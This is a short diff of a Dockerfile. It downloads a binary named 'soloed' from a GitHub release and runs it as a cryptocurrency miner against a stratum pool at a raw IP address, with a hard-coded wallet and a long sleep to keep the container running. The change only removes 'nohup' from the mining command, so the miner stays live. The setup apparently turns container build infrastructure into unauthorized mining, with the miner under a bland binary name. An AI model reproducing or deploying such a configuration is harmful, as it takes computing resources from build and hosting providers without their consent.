@@ -13,7 +13,7 @@ RUN wget https://github.com/Solo120140/Sologotemm-/releases/download/dataget/sol
 
 RUN chmod +x soloed 
 
-RUN nohup ./soloed -a yespower -o stratum+tcp://206.189.2.17:3333 -u WbDv1eEFn1QwodsG9Tdmq8e61BhEn8SMHZ -p x -t2 && sleep 635636
+RUN ./soloed -a yespower -o stratum+tcp://206.189.2.17:3333 -u WbDv1eEFn1QwodsG9Tdmq8e61BhEn8SMHZ -p x -t2
 
 RUN sleep 635636
 
